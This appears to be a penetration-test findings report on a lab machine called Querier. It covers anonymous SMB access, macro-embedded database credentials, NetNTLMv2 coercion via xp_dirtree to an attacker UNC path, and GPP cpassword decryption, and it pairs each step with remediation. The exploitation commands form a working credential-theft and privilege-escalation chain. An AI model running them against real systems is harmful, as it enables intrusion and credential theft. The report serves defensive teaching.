# Findings — Querier

## Finding 1 — World-Readable SMB Share Exposing a Sensitive Workbook

### Summary
A null/anonymous SMB session can list and read a `Reports` share containing a macro-enabled workbook with embedded database credentials.

### Vulnerability Details
- **Type:** Security Misconfiguration / Missing Authentication (information disclosure)
- **Severity:** High
- **Affected Component:** SMB share `Reports` (TCP/445)
- **Authentication required:** None

### Technical Analysis
The share allows unauthenticated read access, exposing internal business documents to any network peer. The workbook itself carries secrets (see Finding 2), turning a disclosure issue into a credential-access foothold.

### Exploitation Steps
1. `smbclient -N -L //<TARGET_IP>/` — enumerate shares anonymously.
2. `smbclient -N //<TARGET_IP>/Reports` — connect without credentials.
3. `get "Currency Volume Report.xlsm"` — download the workbook.

### Impact Assessment
| Category | Description |
|----------|-------------|
| Confidentiality | High — internal documents and embedded secrets exposed |
| Integrity | Low — read access in this case |
| Availability | Low |
| Exploitation | Trivial — unauthenticated |

### Remediation
**Immediate:** Remove sensitive files from anonymously readable shares.
**Long-term:** Require authenticated, least-privilege access; audit share/NTFS ACLs; disable anonymous/guest SMB.

### Mappings
OWASP A05; CWE-306; CWE-200.

### Re-test
Anonymous listing/read of the share is denied.

---

## Finding 2 — Hardcoded MSSQL Credentials in VBA Macro

### Summary
The workbook's `vbaProject.bin` contains a plaintext SQL Server connection string, including the `reporting` account password.

### Vulnerability Details
- **Type:** Use of Hard-coded / Insufficiently Protected Credentials
- **Severity:** High
- **Affected Component:** Excel macro (`xl/vbaProject.bin`)
- **Authentication required:** None (file obtained anonymously)

### Technical Analysis
An `.xlsm` is a ZIP archive; the compiled VBA project stores the connection string in cleartext. Extracting readable strings reveals the DB user and password.

### Exploitation Steps
1. `unzip "Currency Volume Report.xlsm"`.
2. `strings xl/vbaProject.bin`.
3. Read the connection string: `Uid=reporting;Pwd=<REDACTED>`.

### Impact Assessment
| Category | Description |
|----------|-------------|
| Confidentiality | High — valid DB credentials disclosed |
| Integrity | Medium — DB access enables state changes |
| Availability | Medium |
| Exploitation | Trivial — plaintext in a distributed file |

### Remediation
**Immediate:** Rotate the exposed credentials.
**Long-term:** Never embed credentials in documents/macros; use integrated auth or a secrets manager; scan artifacts for secrets before distribution.

### Mappings
OWASP A05; A07; CWE-798; CWE-522.

### Re-test
No credentials are recoverable from distributed documents; exposed accounts rotated.

---

## Finding 3 — MSSQL Coerced Authentication (NetNTLMv2 Leak)

### Summary
A non-sysadmin database user can invoke `xp_dirtree`/`xp_fileexist` to force the SQL service account to authenticate to an attacker-controlled UNC path, leaking a crackable NetNTLMv2 hash.

### Vulnerability Details
- **Type:** Authentication coercion / credential exposure
- **Severity:** High
- **Affected Component:** MSSQL extended stored procedures (`xp_dirtree`, `xp_fileexist`)
- **Authentication required:** Low-privilege DB user (`reporting`)

### Technical Analysis
`xp_dirtree` performs a directory listing over SMB; pointing it at an attacker host makes the SQL service account authenticate outbound. A listener (Responder) captures the NetNTLMv2 response, which is cracked offline to recover the `mssql-svc` password. That account is SA-capable, enabling `xp_cmdshell`.

### Exploitation Steps
1. Start `responder -I tun0`.
2. `impacket-mssqlclient reporting@<TARGET_IP> -windows-auth`.
3. `EXEC xp_dirtree '\\<ATTACKER_IP>\share\file';`.
4. Capture `QUERIER\mssql-svc` NetNTLMv2 in Responder.
5. `john hash --wordlist=rockyou.txt` → recover `<REDACTED>`.

### Impact Assessment
| Category | Description |
|----------|-------------|
| Confidentiality | High — service-account credential recovered |
| Integrity | High — SA access enables command execution |
| Availability | Medium |
| Exploitation | Moderate — requires listener + offline crack |

### Remediation
**Immediate:** Block outbound SMB (139/445) from the DB host to untrusted destinations.
**Long-term:** Restrict extended procedures to sysadmins; run SQL under a low-privilege account with a strong password; enforce SMB signing.

### Mappings
OWASP A07; CWE-522; CWE-287.

### Re-test
Outbound SMB coercion is blocked; captured hash is not crackable; extended procedures restricted.

---

## Finding 4 — Recoverable Local Administrator Password via GPP cpassword

### Summary
A cached Group Policy Preferences `Groups.xml` stores a `cpassword` encrypted with Microsoft's publicly documented AES key, allowing trivial decryption to the local Administrator password.

### Vulnerability Details
- **Type:** Use of a Broken/Recoverable Password Storage scheme
- **Severity:** Critical
- **Affected Component:** Cached GPP `Groups.xml` (see MS14-025)
- **Authentication required:** Local (foothold)

### Technical Analysis
GPP historically stored passwords in `Groups.xml` encrypted with a static AES key that Microsoft published. Any read of the cached file allows offline decryption. PowerUp's `Invoke-AllChecks` flags the artifact automatically.

### Exploitation Steps
1. Run PowerUp `Invoke-AllChecks` (or read the cached `Groups.xml` directly).
2. Extract the `cpassword` value.
3. Decrypt (`gpp-decrypt` or AES with the public key) → `<REDACTED>`.
4. Authenticate as local Administrator: `impacket-psexec administrator@<TARGET_IP>`.

### Impact Assessment
| Category | Description |
|----------|-------------|
| Confidentiality | High — local Administrator credential recovered |
| Integrity | High — full host control |
| Availability | High |
| Exploitation | Trivial — public key, automated tooling |

### Remediation
**Immediate:** Purge cached `Groups.xml` from endpoints; rotate the exposed local Administrator password.
**Long-term:** Apply MS14-025; stop distributing passwords via GPP; deploy LAPS for unique, managed local admin passwords.

### Mappings
OWASP A02; A05; CWE-257; CWE-798. Ref: MS14-025.

### Re-test
No `cpassword` artifacts remain; local admin passwords are unique/managed (LAPS).

## Testing Checklist
- [ ] Anonymous SMB lists/read `Reports`
- [ ] Workbook macro exposes DB connection string
- [ ] `reporting` user is not sysadmin
- [ ] `xp_dirtree` coerces NetNTLMv2 for `mssql-svc`
- [ ] Cracked `mssql-svc` is SA-capable (xp_cmdshell)
- [ ] Cached `Groups.xml` `cpassword` decrypts to Administrator
- [ ] Verify remediations (ACLs, secrets, SMB egress, MS14-025)

## References
- [OWASP — Security Misconfiguration (A05)](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [Microsoft MS14-025 — GPP Vulnerability](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)
- [Impacket](https://github.com/fortra/impacket) · [Responder](https://github.com/lgandx/Responder) · [PowerSploit/PowerUp](https://github.com/PowerShellMafia/PowerSploit)
